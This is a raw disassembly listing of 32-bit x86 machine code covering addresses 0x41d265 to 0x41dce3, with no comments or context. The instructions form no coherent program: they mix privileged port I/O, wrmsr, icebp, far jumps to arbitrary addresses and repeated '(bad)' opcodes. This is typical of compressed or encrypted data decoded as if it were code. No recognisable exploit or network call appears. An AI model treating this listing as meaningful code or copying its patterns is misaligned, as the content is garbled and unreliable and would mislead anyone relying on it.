  41d265:	mov    cl,bl
  41d267:	cdq    
  41d268:	fidiv  WORD PTR [edi]
  41d26a:	pushf  
  41d26b:	mov    ecx,0x2a410742
  41d270:	mov    edx,0xf66fe8a1
  41d275:	das    
  41d276:	jns    0x41d25c
  41d278:	mov    edi,0x522c70e8
  41d27d:	dec    eax
  41d27e:	cmp    eax,0x61a810e6
  41d283:	test   eax,0xe8caa1db
  41d288:	cdq    
  41d289:	dec    eax
  41d28a:	call   0xef762a3c
  41d28f:	inc    ecx
  41d290:	and    ecx,edx
  41d292:	sti    
  41d293:	ins    DWORD PTR es:[edi],dx
  41d294:	out    0xcf,eax
  41d296:	push   cs
  41d297:	imul   esi,ebp,0x66
  41d29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d29b:	mov    bl,0x3a
  41d29d:	inc    edx
  41d29e:	pop    eax
  41d29f:	or     BYTE PTR [ebp+0xa],ah
  41d2a2:	sub    esi,edi
  41d2a4:	call   0x4363f5f9
  41d2a9:	mov    es,edx
  41d2ab:	test   DWORD PTR [eax+0x3667f1c7],0x8513a75d
  41d2b5:	dec    eax
  41d2b6:	dec    edx
  41d2b7:	es cwde 
  41d2b9:	jp     0x41d32f
  41d2bb:	mov    ds:0x727771b2,al
  41d2c0:	mov    fs,WORD PTR [edi+0x54]
  41d2c3:	inc    edi
  41d2c4:	mov    ecx,0xe8cf8910
  41d2c9:	adc    eax,0xbce50085
  41d2ce:	in     eax,0xa1
  41d2d0:	mov    ebp,DWORD PTR ss:[edx+0x1f]
  41d2d4:	ror    DWORD PTR [edi-0x3c],1
  41d2d7:	xchg   esp,eax
  41d2d8:	scas   eax,DWORD PTR es:[edi]
  41d2d9:	ja     0x41d2e5
  41d2db:	sub    eax,0x1ed33ef9
  41d2e0:	pop    ebx
  41d2e1:	xor    DWORD PTR [eax-0x3b],0xffffff9b
  41d2e5:	iret   
  41d2e6:	test   eax,0xaaa7a2b2
  41d2eb:	imul   ebp,DWORD PTR [ebp-0x79ab1515],0x7
  41d2f2:	hlt    
  41d2f3:	fcomip st,st(6)
  41d2f5:	stc    
  41d2f6:	mov    al,ds:0x7c01a0c8
  41d2fb:	add    ch,dh
  41d2fd:	out    dx,al
  41d2fe:	cwde   
  41d2ff:	inc    ebx
  41d300:	shr    DWORD PTR [edi+0x5d],cl
  41d303:	fsubrp st(0),st
  41d305:	ins    BYTE PTR es:[edi],dx
  41d306:	les    edx,FWORD PTR [edi+0x7547dd57]
  41d30c:	and    eax,0x76d9b20
  41d311:	pushf  
  41d312:	icebp  
  41d313:	jnp    0x41d2aa
  41d315:	sbb    bh,al
  41d317:	xor    eax,0x84255178
  41d31c:	push   ss
  41d31d:	rol    BYTE PTR [edx+eax*1],cl
  41d320:	xchg   ebx,eax
  41d321:	pop    ds
  41d322:	sbb    BYTE PTR [edi-0x5086508f],ah
  41d328:	add    bh,0xd8
  41d32b:	and    cl,BYTE PTR [ecx+ebp*4-0x6c]
  41d32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d330:	mov    ebp,0x84b1fff1
  41d335:	mov    eax,ds:0x798eca11
  41d33a:	int    0x2b
  41d33c:	mov    al,0x25
  41d33e:	mov    dh,0x4e
  41d340:	dec    BYTE PTR [eax+0x0]
	...
  41d3b2:	add    BYTE PTR [eax],al
  41d3b4:	push   ebx
  41d3b5:	and    BYTE PTR [eax+0x5faef3ae],ah
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	pop    eax
  41d3c1:	in     eax,dx
  41d3c2:	and    eax,0x13b12a9
  41d3c7:	add    dh,dh
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    BYTE PTR [esi-0x7],al
  41d3ce:	xchg   ebp,eax
  41d3cf:	cs xchg edi,eax
  41d3d1:	outs   dx,DWORD PTR ds:[esi]
  41d3d2:	inc    esi
  41d3d3:	je     0x41d410
  41d3d5:	push   ecx
  41d3d6:	jp     0x41d433
  41d3d8:	cmp    BYTE PTR [edx+0x2f933451],al
  41d3de:	pop    ds
  41d3df:	fadd   QWORD PTR [edi+0x463823c3]
  41d3e5:	cmp    al,0xca
  41d3e7:	inc    ebx
  41d3e8:	xchg   BYTE PTR [edi-0x58],bh
  41d3eb:	ret    
  41d3ec:	push   0x107dfd21
  41d3f1:	data16 jle 0x41d463
  41d3f4:	adc    eax,0x3770974a
  41d3f9:	sbb    dh,BYTE PTR [esi]
  41d3fb:	push   esi
  41d3fc:	sbb    DWORD PTR [esi],eax
  41d3fe:	sub    bl,BYTE PTR [edx]
  41d400:	cmp    BYTE PTR ds:0x47d7fbd8,dh
  41d406:	cmc    
  41d407:	push   esi
  41d408:	cld    
  41d409:	jmp    0x79a8:0x676ed69
  41d410:	nop
  41d411:	sub    eax,0xd11279b7
  41d416:	pop    esi
  41d417:	into   
  41d418:	cmp    al,0x24
  41d41a:	xor    ch,dl
  41d41c:	mov    DWORD PTR [ecx+0x4d82ebd5],ecx
  41d422:	dec    esp
  41d423:	and    BYTE PTR [eax-0x41],ch
  41d426:	call   0x8b44d2e5
  41d42b:	push   edx
  41d42c:	test   al,0xb3
  41d42e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d42f:	imul   esp,ebp,0x87526320
  41d435:	mov    ah,0x7d
  41d437:	xlat   BYTE PTR ds:[ebx]
  41d438:	push   ebp
  41d439:	fwait
  41d43a:	retf   0x8b09
  41d43d:	xor    DWORD PTR [edx-0x4033a6dc],edi
  41d443:	fadd   st,st(3)
  41d445:	shl    BYTE PTR [eax],1
  41d447:	and    edx,ebp
  41d449:	rcl    BYTE PTR [ecx],cl
  41d44b:	xor    al,0x29
  41d44d:	in     al,0xb4
  41d44f:	loop   0x41d3fb
  41d451:	xchg   ecx,eax
  41d452:	or     cl,BYTE PTR [edx+0x25]
  41d455:	das    
  41d456:	and    eax,0x7bf24704
  41d45b:	mov    ds:0x78a1bb6,eax
  41d460:	and    eax,0x1dc3a607
  41d465:	loopne 0x41d4cb
  41d467:	fld    TBYTE PTR [edi+0x77]
  41d46a:	pmaxsw mm6,QWORD PTR [eax+0x2613f8e2]
  41d471:	call   0x3330:0xabec4941
  41d478:	xor    DWORD PTR ds:0x9cbd0ccd,0x51
  41d47f:	dec    edx
  41d480:	adc    BYTE PTR [edx],al
  41d482:	pop    ebx
  41d483:	dec    ebp
  41d484:	(bad)  
  41d485:	add    esi,eax
  41d487:	stc    
  41d488:	shr    DWORD PTR [eax+0x1c],cl
  41d48b:	mov    esi,0xe531cbfd
  41d490:	push   es
  41d491:	xor    ebp,DWORD PTR [edx]
  41d493:	ror    BYTE PTR ds:0xcbf29af9,0x92
  41d49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d49c:	ja     0x41d4d5
  41d49e:	pop    esi
  41d49f:	shl    BYTE PTR [esi-0x2d],cl
  41d4a2:	not    al
  41d4a4:	push   eax
  41d4a5:	outs   dx,BYTE PTR ds:[esi]
  41d4a6:	jno    0x41d4d6
  41d4a8:	aad    0x98
  41d4aa:	(bad)  
  41d4ab:	mov    ecx,0xf7dc033b
  41d4b0:	(bad)  
  41d4b2:	(bad)  
  41d4b3:	sub    edx,DWORD PTR ds:0x6adfadda
  41d4b9:	fnstcw WORD PTR [ebp+0x1a514e9e]
  41d4bf:	daa    
  41d4c0:	wrmsr  
	...
  41d532:	add    BYTE PTR [eax],al
  41d534:	lds    esp,FWORD PTR [ebx]
  41d536:	xchg   ecx,eax
  41d537:	and    eax,0xe3f5b7f7
  41d53c:	push   ecx
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x244eda20]
  41d544:	or     BYTE PTR [ecx+eax*1],bh
  41d547:	add    dh,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [edx-0x718fe9f7],cl
  41d551:	test   DWORD PTR [esi+0x31883611],0xd0c83310
  41d55b:	(bad)  
  41d55d:	adc    DWORD PTR [edx-0x1a],ebx
  41d560:	mov    al,0xa4
  41d562:	or     DWORD PTR [esi-0x7d],esp
  41d565:	daa    
  41d566:	es retw 
  41d569:	fadd   QWORD PTR [ebx+0x47]
  41d56c:	mov    edx,0xf65ff21a
  41d571:	mov    fs,ebx
  41d573:	out    0xb6,eax
  41d575:	call   0xa67d:0xad744b9a
  41d57c:	xchg   esp,eax
  41d57d:	inc    esp
  41d57e:	int    0x1a
  41d580:	mov    ah,0xf7
  41d582:	in     eax,dx
  41d583:	adc    DWORD PTR [esi+esi*8],esi
  41d586:	jbe    0x41d601
  41d588:	fdiv   DWORD PTR [ecx+0x21]
  41d58b:	xchg   edx,eax
  41d58c:	outs   dx,BYTE PTR ds:[esi]
  41d58d:	out    dx,al
  41d58e:	mov    dl,0x37
  41d590:	out    0xf4,eax
  41d592:	mov    ds:0xe90a9c71,eax
  41d597:	push   edi
  41d598:	icebp  
  41d599:	and    eax,DWORD PTR [ecx]
  41d59b:	mov    ecx,0xd583d457
  41d5a0:	cld    
  41d5a1:	cld    
  41d5a2:	es push ebp
  41d5a4:	dec    edx
  41d5a5:	icebp  
  41d5a6:	outs   dx,BYTE PTR ds:[esi]
  41d5a7:	xor    DWORD PTR [edx+0x59a40547],0x40
  41d5ae:	mov    ebp,0x9e103eef
  41d5b3:	lods   eax,DWORD PTR ds:[esi]
  41d5b4:	mov    ch,0xf5
  41d5b6:	mov    dl,0x5e
  41d5b8:	nop
  41d5b9:	push   ebx
  41d5ba:	loope  0x41d5a7
  41d5bc:	movaps XMMWORD PTR [ebp+edx*4+0x726066a2],xmm2
  41d5c4:	pop    edi
  41d5c5:	inc    edx
  41d5c6:	leave  
  41d5c7:	mov    ah,0x1a
  41d5c9:	sbb    DWORD PTR [eax+ebp*4+0x34f100b8],edi
  41d5d0:	mov    ds:0x4b9ba564,eax
  41d5d5:	jbe    0x41d56f
  41d5d7:	jp     0x41d599
  41d5d9:	dec    edi
  41d5da:	push   ebx
  41d5db:	add    bl,BYTE PTR [ebp-0x23]
  41d5de:	and    BYTE PTR [ecx+ecx*4+0x7c],ah
  41d5e2:	sub    bh,BYTE PTR [eax]
  41d5e4:	sbb    eax,0x8efb718a
  41d5e9:	mov    DWORD PTR [ebp+0x32],0xfc76552c
  41d5f0:	push   edi
  41d5f1:	shl    BYTE PTR [ebp-0x32],0x6
  41d5f5:	or     ebx,esp
  41d5f7:	aas    
  41d5f8:	loopne 0x41d63b
  41d5fa:	mov    edx,0xe6519624
  41d5ff:	sbb    edi,DWORD PTR [esp+edi*2-0x7906bd9e]
  41d606:	out    dx,al
  41d607:	inc    ebx
  41d608:	push   0x77
  41d60a:	sbb    BYTE PTR [ecx-0x3f0d3fad],ah
  41d610:	and    al,0x5e
  41d612:	pop    ebp
  41d613:	out    0xfa,eax
  41d615:	push   esp
  41d616:	xchg   ebx,eax
  41d617:	xor    DWORD PTR [esi],eax
  41d619:	xchg   DWORD PTR [edx-0x7],ebx
  41d61c:	fs pop eax
  41d61e:	sub    BYTE PTR [edx-0x3c],ch
  41d621:	adc    esi,DWORD PTR [eax]
  41d623:	jg     0x41d621
  41d625:	stc    
  41d626:	mul    DWORD PTR [edx+0x55a7cdc0]
  41d62c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d62d:	outs   dx,BYTE PTR ds:[esi]
  41d62e:	push   ds
  41d62f:	cli    
  41d630:	cwde   
  41d631:	outs   dx,BYTE PTR ds:[esi]
  41d632:	ja     0x41d5fc
  41d634:	inc    edi
  41d635:	(bad)  
  41d636:	aas    
  41d637:	and    DWORD PTR [edi],edi
  41d639:	fs push es
  41d63b:	mov    ecx,0x1b267da7
  41d640:	aad    0x2a
	...
  41d6b2:	add    BYTE PTR [eax],al
  41d6b4:	fiadd  DWORD PTR [ecx]
  41d6b6:	ret    0xdb86
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0x51c10a3b
  41d6c2:	xlat   BYTE PTR ds:[ebx]
  41d6c3:	je     0x41d6c3
  41d6c5:	cmp    al,0x1
  41d6c7:	add    dh,dh
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [eax],bh
  41d6cd:	pop    ebx
  41d6ce:	mov    eax,esi
  41d6d0:	lea    ecx,[ebx+0x57]
  41d6d3:	test   BYTE PTR [edi+0x36],ah
  41d6d6:	push   ecx
  41d6d7:	jne    0x41d732
  41d6d9:	sbb    cl,BYTE PTR ds:0xcd3f19ff
  41d6df:	add    eax,0xbedad1c3
  41d6e4:	add    ch,BYTE PTR ds:0xa8fb7839
  41d6ea:	xchg   esp,eax
  41d6eb:	retf   0x17ba
  41d6ee:	call   0x9a84bedc
  41d6f3:	push   esi
  41d6f4:	popf   
  41d6f5:	and    eax,DWORD PTR [edx-0x5c]
  41d6f8:	xchg   edi,eax
  41d6f9:	pushf  
  41d6fa:	iret   
  41d6fb:	sub    al,0xa
  41d6fd:	cli    
  41d6fe:	mov    bl,0x22
  41d700:	in     al,0xf9
  41d702:	sub    DWORD PTR [esi-0x76],0xffffffbe
  41d706:	cwde   
  41d707:	call   0xe316:0x1e6a5729
  41d70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d70f:	icebp  
  41d710:	aad    0xc6
  41d712:	lea    esp,[ebp-0x66]
  41d715:	arpl   WORD PTR [esi],di
  41d717:	clc    
  41d718:	jne    0x41d739
  41d71a:	dec    ebx
  41d71b:	mov    cl,0x98
  41d71d:	ins    DWORD PTR es:[edi],dx
  41d71e:	rcr    BYTE PTR [esi-0x26],1
  41d721:	scas   eax,DWORD PTR es:[edi]
  41d722:	inc    esi
  41d723:	mov    dl,0x74
  41d725:	aad    0x9f
  41d727:	dec    eax
  41d728:	stos   DWORD PTR es:[edi],eax
  41d729:	mov    DWORD PTR [ecx+0x6e],ebp
  41d72c:	pusha  
  41d72d:	fsub   st(0),st
  41d72f:	cmp    eax,0x26b90502
  41d734:	leave  
  41d735:	adc    esp,edx
  41d737:	inc    ebp
  41d738:	test   eax,0x59db1462
  41d73d:	ret    
  41d73e:	and    ebx,ebx
  41d740:	inc    edx
  41d741:	add    BYTE PTR [eax],dh
  41d743:	pop    ds
  41d744:	mov    dl,0x24
  41d746:	or     ch,BYTE PTR [esi]
  41d748:	fistp  DWORD PTR [esi-0x26]
  41d74b:	dec    edi
  41d74c:	add    bl,BYTE PTR [ebp-0xa011482]
  41d752:	test   eax,0x5b448f11
  41d757:	aaa    
  41d758:	ds dec ebp
  41d75a:	sub    eax,0x437fa3c2
  41d75f:	pop    ecx
  41d760:	imul   ecx,DWORD PTR [esi+edx*2+0x4bbebe3d],0x73c39d33
  41d76b:	cwde   
  41d76c:	pop    ecx
  41d76d:	jp     0x41d7d0
  41d76f:	fbld   TBYTE PTR [ecx]
  41d771:	pop    DWORD PTR [edi-0x1288387e]
  41d777:	mov    ebx,0x49ec6707
  41d77c:	aas    
  41d77d:	leave  
  41d77e:	jmp    0x744f16be
  41d783:	dec    edi
  41d784:	sub    BYTE PTR [edi],0x86
  41d787:	push   0xa
  41d789:	sti    
  41d78a:	out    0x18,al
  41d78c:	pop    eax
  41d78d:	mov    al,ds:0xcc251316
  41d792:	scas   al,BYTE PTR es:[edi]
  41d793:	pop    ss
  41d794:	xchg   ebx,eax
  41d795:	adc    esp,ecx
  41d797:	popf   
  41d798:	pop    edi
  41d799:	and    al,BYTE PTR [esi+0x58]
  41d79c:	shr    DWORD PTR [edx+0x394d27d2],1
  41d7a2:	mov    ecx,0x495bf91b
  41d7a7:	xlat   BYTE PTR ds:[ebx]
  41d7a8:	jnp    0x41d810
  41d7aa:	jb     0x41d78e
  41d7ac:	dec    edi
  41d7ad:	scas   al,BYTE PTR es:[edi]
  41d7ae:	jg     0x41d735
  41d7b0:	adc    eax,0x52b6b2d7
  41d7b5:	sar    BYTE PTR [edx+0x6e],0xd8
  41d7b9:	inc    ebp
  41d7ba:	test   al,0x78
  41d7bc:	fld    QWORD PTR [ecx+0x75]
  41d7bf:	sbb    al,0x70
  41d7c1:	dec    ebp
	...
  41d832:	add    BYTE PTR [eax],al
  41d834:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41d83b:	ja     0x41d7c4
  41d83d:	repnz pop es
  41d83f:	add    esi,DWORD PTR [ecx-0x7f]
  41d842:	mov    esi,0x13df423
  41d847:	add    dh,dh
  41d849:	add    BYTE PTR [eax],al
  41d84b:	add    BYTE PTR [edx-0x63],ch
  41d84e:	inc    BYTE PTR [ecx]
  41d850:	test   DWORD PTR [edi-0x73b04f27],ebx
  41d856:	xor    dl,0xfd
  41d859:	add    cl,BYTE PTR [ebp-0xee9a463]
  41d85f:	sub    esp,esi
  41d861:	mov    ebp,0x787489ab
  41d866:	push   ebx
  41d867:	and    eax,0x97d34c21
  41d86c:	sub    DWORD PTR [ecx+0x6f],ebp
  41d86f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d870:	xchg   ebx,ebx
  41d872:	xor    ebx,DWORD PTR [ecx+0x22b6b8fe]
  41d878:	xlat   BYTE PTR ds:[ebx]
  41d879:	gs mov bh,0xe3
  41d87c:	addr16 aas 
  41d87e:	xchg   edi,eax
  41d87f:	fdiv   QWORD PTR [edx+edx*1+0x2b98cd87]
  41d886:	and    DWORD PTR [edi+0x78],edx
  41d889:	xor    bh,ah
  41d88b:	mov    ecx,0x993065cb
  41d890:	addr16 push esi
  41d892:	retf   
  41d893:	hlt    
  41d894:	adc    eax,0xc7fe5d5d
  41d899:	pop    edx
  41d89a:	dec    esi
  41d89b:	in     al,0x9f
  41d89d:	mov    ecx,0x6b69c315
  41d8a2:	adc    eax,0xea1023fe
  41d8a7:	nop
  41d8a8:	adc    DWORD PTR [ebx+0x5a],ebx
  41d8ab:	in     al,dx
  41d8ac:	sub    esp,ecx
  41d8ae:	pushf  
  41d8af:	and    eax,0xbf340928
  41d8b4:	jne    0x41d891
  41d8b6:	push   es
  41d8b7:	popf   
  41d8b8:	mov    al,0x77
  41d8ba:	outs   dx,BYTE PTR ds:[esi]
  41d8bb:	push   eax
  41d8bc:	push   ss
  41d8bd:	pop    ds
  41d8be:	cdq    
  41d8bf:	cs mov bl,0x54
  41d8c2:	(bad)
  41d8c5:	sub    dl,bh
  41d8c7:	inc    edx
  41d8c8:	lds    esp,FWORD PTR [ecx]
  41d8ca:	call   0x2e01d985
  41d8cf:	jae    0x41d8c4
  41d8d1:	hlt    
  41d8d2:	(bad)  
  41d8d3:	test   DWORD PTR [esp+ebx*1+0x233b66a6],0x1aa921cb
  41d8de:	pop    ebp
  41d8df:	mov    ebx,0xecc6cd1e
  41d8e4:	xor    BYTE PTR [esp+edx*8+0x7903a6ca],bh
  41d8eb:	and    al,0xd3
  41d8ed:	pop    eax
  41d8ee:	pop    eax
  41d8ef:	int3   
  41d8f0:	in     al,dx
  41d8f1:	stos   DWORD PTR es:[edi],eax
  41d8f2:	ins    DWORD PTR es:[edi],dx
  41d8f3:	adc    DWORD PTR [edi+0x53],eax
  41d8f6:	add    al,0xee
  41d8f8:	inc    DWORD PTR [ecx+edx*4]
  41d8fb:	dec    esp
  41d8fc:	jge    0x41d8af
  41d8fe:	cld    
  41d8ff:	cmp    esi,DWORD PTR [ebx-0x7c5206c6]
  41d905:	inc    esp
  41d906:	fdivr  DWORD PTR [ecx+0x2b]
  41d909:	repnz nop
  41d90b:	aam    0xba
  41d90d:	fs dec esp
  41d90f:	adc    BYTE PTR [ebp+0x7681689b],ch
  41d915:	scas   eax,DWORD PTR es:[edi]
  41d916:	test   al,0x11
  41d918:	mov    ch,0xd5
  41d91a:	sar    esp,1
  41d91c:	test   al,0x9c
  41d91e:	aas    
  41d91f:	mov    al,ds:0xe9dcd938
  41d924:	add    BYTE PTR [edx],0x49
  41d927:	and    al,0xf7
  41d929:	xor    DWORD PTR [ecx],0xc
  41d92c:	(bad)  
  41d92d:	jecxz  0x41d960
  41d92f:	inc    ecx
  41d930:	adc    eax,0x536ad52a
  41d935:	mov    WORD PTR [esi+0x23df7f77],cs
  41d93b:	repnz (bad) 
  41d93e:	std    
  41d93f:	jbe    0x41d970
  41d941:	repz add BYTE PTR [eax],al
	...
  41d9b4:	lock retf 0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x998ceb1c
  41d9c3:	daa    
  41d9c4:	jmp    0x0:0xf600013e
  41d9cb:	add    BYTE PTR [ebx],al
  41d9cd:	sbb    al,0x86
  41d9cf:	and    DWORD PTR [ecx+0x4b01f8bc],0x2e7e580e
  41d9d9:	or     BYTE PTR [edx+0x4bb24556],bh
  41d9df:	lock (bad) 
  41d9e1:	sbb    DWORD PTR [eax+ebx*4+0x17a2a4cd],ebx
  41d9e8:	cmp    ecx,ebp
  41d9ea:	add    eax,0x746cdd8
  41d9ef:	aad    0x29
  41d9f1:	in     ax,dx
  41d9f3:	xor    DWORD PTR [eax],ebx
  41d9f5:	jo     0x41da3f
  41d9f7:	repz xor al,0xf2
  41d9fa:	nop
  41d9fb:	push   edx
  41d9fc:	jecxz  0x41da61
  41d9fe:	xchg   esp,eax
  41d9ff:	imul   ebx,DWORD PTR [ebp-0x7e852364],0xffffffe6
  41da06:	jecxz  0x41d9a1
  41da08:	inc    edi
  41da09:	fs xchg esi,eax
  41da0b:	add    dl,0x7b
  41da0e:	xchg   edx,eax
  41da0f:	ja     0x41d9c8
  41da11:	jg     0x41da1e
  41da13:	mov    bl,BYTE PTR [ebp-0x3f93dee0]
  41da19:	shl    DWORD PTR ds:0x2777b814,1
  41da1f:	daa    
  41da20:	fucomip st,st(5)
  41da22:	pop    eax
  41da23:	pop    ecx
  41da24:	or     eax,0xf8e48d93
  41da29:	jg     0x41da72
  41da2b:	mov    ah,0xfe
  41da2d:	loope  0x41da7d
  41da2f:	gs outs dx,DWORD PTR cs:[esi]
  41da32:	dec    eax
  41da33:	test   esp,0x622b0699
  41da39:	in     al,0xe9
  41da3b:	push   esp
  41da3c:	add    edi,DWORD PTR [ebx]
  41da3e:	dec    ebx
  41da3f:	daa    
  41da40:	leave  
  41da41:	cmp    BYTE PTR [ebx-0x77be0a82],0x70
  41da48:	inc    edx
  41da49:	lahf   
  41da4a:	mov    bh,0xcc
  41da4c:	test   dl,0xc7
  41da4f:	repnz imul edi,ecx,0x1d
  41da53:	push   0xc190abb3
  41da58:	adc    eax,0x764a1c6b
  41da5d:	out    0x97,eax
  41da5f:	or     eax,0x802a7054
  41da64:	scas   eax,DWORD PTR es:[edi]
  41da65:	xchg   edx,eax
  41da66:	jecxz  0x41d9f0
  41da68:	xor    BYTE PTR [ebx-0x71],dl
  41da6b:	out    dx,eax
  41da6c:	add    al,0x3e
  41da6e:	add    al,ch
  41da70:	sub    BYTE PTR [eax],dh
  41da72:	into   
  41da73:	sar    bl,cl
  41da75:	je     0x41dad9
  41da77:	push   es
  41da78:	into   
  41da79:	xchg   ebx,eax
  41da7a:	inc    ebp
  41da7b:	fbld   TBYTE PTR [ebp+0x7b]
  41da7e:	out    dx,al
  41da7f:	inc    ebx
  41da80:	stos   BYTE PTR es:[edi],al
  41da81:	neg    DWORD PTR [esp+ebx*2-0x7c]
  41da85:	ror    BYTE PTR [edx+0x1c1821bb],1
  41da8b:	jbe    0x41daa7
  41da8d:	aad    0x15
  41da8f:	sbb    esi,DWORD PTR [edi]
  41da91:	jmp    0x9fa1594a
  41da96:	sbb    esi,ecx
  41da98:	stos   DWORD PTR es:[edi],eax
  41da99:	cdq    
  41da9a:	inc    ebp
  41da9b:	or     dl,BYTE PTR [ebp-0x28]
  41da9e:	test   DWORD PTR [edx],esp
  41daa0:	mov    cl,0xb2
  41daa2:	popf   
  41daa3:	cmp    al,0x1f
  41daa5:	inc    ebx
  41daa6:	or     ah,BYTE PTR ds:0x7f7b9039
  41daac:	mov    dl,0x45
  41daae:	pop    ebx
  41daaf:	jo     0x41da92
  41dab1:	push   cs
  41dab2:	add    eax,0x2bd7c6f9
  41dab7:	js     0x41daaa
  41dab9:	retf   
  41daba:	push   es
  41dabb:	adc    edi,DWORD PTR [edx]
  41dabd:	loope  0x41da8d
  41dabf:	retf   
  41dac0:	nop
  41dac1:	test   DWORD PTR [eax],0x0
	...
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	mov    ebp,0xe0841f66
  41db45:	aas    
  41db46:	add    DWORD PTR [eax],eax
  41db48:	test   BYTE PTR [eax],0x0
  41db4b:	add    al,ah
  41db4d:	hlt    
  41db4e:	jnp    0x41db8e
  41db50:	arpl   bx,sp
  41db52:	xchg   ecx,eax
  41db53:	fidiv  DWORD PTR [eax-0x45692095]
  41db59:	scas   al,BYTE PTR es:[edi]
  41db5a:	xchg   esp,eax
  41db5b:	pop    edi
  41db5c:	mov    edx,0x1319d9b8
  41db61:	pop    ecx
  41db62:	sti    
  41db63:	xchg   cl,bh
  41db65:	les    esi,FWORD PTR es:[edi-0x5ce6646d]
  41db6c:	sbb    al,0x14
  41db6e:	aad    0x73
  41db70:	xor    esp,eax
  41db72:	stos   BYTE PTR es:[edi],al
  41db73:	je     0x41dbd6
  41db75:	out    0x8f,al
  41db77:	sahf   
  41db78:	sbb    BYTE PTR ds:0x4d4d010b,dl
  41db7e:	sub    al,0x5e
  41db80:	dec    edi
  41db81:	scas   al,BYTE PTR es:[edi]
  41db82:	pop    ebx
  41db83:	shl    DWORD PTR [edi-0x60],0xc
  41db87:	stc    
  41db88:	ret    0x64b8
  41db8b:	mov    bl,0xda
  41db8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db8e:	push   0x1b
  41db90:	xchg   edi,eax
  41db91:	mov    edx,0x3781c85b
  41db96:	sbb    DWORD PTR [esi],0x83ded2ec
  41db9c:	and    DWORD PTR [esi-0x2865f6cb],ecx
  41dba2:	mov    BYTE PTR [ebx-0xa],bl
  41dba5:	pop    ds
  41dba6:	in     eax,dx
  41dba7:	mov    cl,0xd8
  41dba9:	inc    edx
  41dbaa:	mov    al,0x9a
  41dbac:	cld    
  41dbad:	shl    BYTE PTR [ecx-0x4],0x8d
  41dbb1:	ret    0x787c
  41dbb4:	lea    edi,[edi]
  41dbb6:	adc    ah,BYTE PTR [ebp-0x7dd5224f]
  41dbbc:	rcr    BYTE PTR [esi],1
  41dbbe:	xchg   edi,eax
  41dbbf:	pusha  
  41dbc0:	cmp    BYTE PTR [edi],ah
  41dbc2:	push   esi
  41dbc3:	sub    bl,BYTE PTR [eax-0x63ce09af]
  41dbc9:	int3   
  41dbca:	dec    ecx
  41dbcb:	dec    esi
  41dbcc:	sbb    DWORD PTR [ebp-0x78dc20d1],ecx
  41dbd2:	pop    ss
  41dbd3:	jg     0x41dbd4
  41dbd5:	fldcw  WORD PTR [eax+0x15c23010]
  41dbdb:	into   
  41dbdc:	outs   dx,BYTE PTR ds:[esi]
  41dbdd:	mov    ah,0xf6
  41dbdf:	sub    al,0xd3
  41dbe1:	sub    DWORD PTR [ebx],esi
  41dbe3:	jp     0x41dc33
  41dbe5:	ret    
  41dbe6:	push   edx
  41dbe7:	dec    ebx
  41dbe8:	xchg   edx,eax
  41dbe9:	lods   eax,DWORD PTR ds:[esi]
  41dbea:	dec    edx
  41dbeb:	cmp    BYTE PTR [eax-0x5e],0xdf
  41dbef:	xchg   esi,eax
  41dbf0:	xor    DWORD PTR [ebx-0x165321f2],ebp
  41dbf6:	test   ecx,ecx
  41dbf8:	mov    edx,0x238fb7c
  41dbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbfe:	and    ah,al
  41dc00:	cld    
  41dc01:	mov    bl,BYTE PTR [edx+esi*1+0x4e]
  41dc05:	sub    eax,0x71264e64
  41dc0a:	and    DWORD PTR [ecx+ebp*8-0x8d48c41],esi
  41dc11:	mov    ebp,0x8c1e5dc4
  41dc16:	fild   WORD PTR [ebx]
  41dc18:	cmc    
  41dc19:	and    bh,ch
  41dc1b:	iret   
  41dc1c:	int3   
  41dc1d:	mov    dh,0x94
  41dc1f:	aaa    
  41dc20:	fwait
  41dc21:	lods   al,BYTE PTR ds:[esi]
  41dc22:	jo     0x41dc8a
  41dc24:	jb     0x41dbb5
  41dc26:	sub    DWORD PTR [ebp+0x7d],esp
  41dc29:	and    al,BYTE PTR ds:0x1de9fae6
  41dc2f:	dec    esp
  41dc30:	out    dx,eax
  41dc31:	inc    edi
  41dc32:	scas   al,BYTE PTR es:[edi]
  41dc33:	cmp    BYTE PTR [eax-0x37175689],al
  41dc39:	pop    ecx
  41dc3a:	mov    ah,0xdd
  41dc3c:	sbb    al,0x72
  41dc3e:	pusha  
  41dc3f:	sar    BYTE PTR [ecx+0x89],0x0
	...
  41dcb2:	add    BYTE PTR [eax],al
  41dcb4:	pusha  
  41dcb5:	cdq    
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x85
  41dcc1:	cmp    DWORD PTR [edx+edx*4-0x2a],ebp
  41dcc5:	inc    eax
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	test   BYTE PTR [eax],0x0
  41dccb:	add    BYTE PTR ds:0x81cda2c,bh
  41dcd1:	adc    DWORD PTR [eax+0x7],ecx
  41dcd4:	jnp    0x41dd28
  41dcd6:	sti    
  41dcd7:	ss sub eax,0xea7d5644
  41dcdd:	and    esp,DWORD PTR ds:0x59fecf60
  41dce3:	jge    0x41dc70
